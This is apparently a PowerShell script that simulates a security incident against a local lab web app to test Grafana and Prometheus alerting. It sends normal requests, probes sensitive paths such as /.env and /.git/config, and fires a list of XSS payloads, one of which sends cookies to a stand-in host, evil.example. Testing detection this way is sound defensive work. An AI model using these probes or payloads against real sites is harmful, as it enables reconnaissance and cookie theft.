# Simulacion de incidente de seguridad contra el entorno de produccion (laboratorio local).
# Fase 1: trafico legitimo. Fase 2: reconocimiento de rutas. Fase 3: intentos de XSS.
# Uso: powershell -ExecutionPolicy Bypass -File scripts\simular_incidente.ps1
param(
    [string]$BaseUrl = "http://localhost:5020"
)

function Send-Request([string]$Path) {
    try {
        $r = Invoke-WebRequest -Uri ($BaseUrl + $Path) -UseBasicParsing -TimeoutSec 5
        $code = [int]$r.StatusCode
    } catch {
        if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode } else { $code = "ERR" }
    }
    Write-Host ("{0}  {1}" -f $code, $Path)
}

Write-Host "== Fase 1: trafico legitimo ==" -ForegroundColor Green
$names = @("Ana", "Pedro", "Maria", "Jose", "Camila", "Diego")
for ($i = 0; $i -lt 30; $i++) {
    Send-Request ("/hello?name=" + $names[$i % $names.Count])
    Start-Sleep -Milliseconds 300
}

Write-Host "== Fase 2: reconocimiento de rutas ==" -ForegroundColor Yellow
foreach ($p in @("/admin", "/.env", "/wp-login.php", "/phpmyadmin", "/console", "/config.json", "/backup.zip", "/.git/config")) {
    Send-Request $p
    Start-Sleep -Milliseconds 200
}

Write-Host "== Fase 3: intentos de XSS ==" -ForegroundColor Red
$payloads = @(
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "`"><script>fetch('http://evil.example/'+document.cookie)</script>",
    "<body onload=alert('XSS')>"
)
foreach ($p in $payloads) {
    Send-Request ("/hello?name=" + [uri]::EscapeDataString($p))
    Start-Sleep -Milliseconds 300
}

Write-Host "Simulacion terminada. Revisar Grafana (http://localhost:3000) y Prometheus (http://localhost:9090/alerts)."
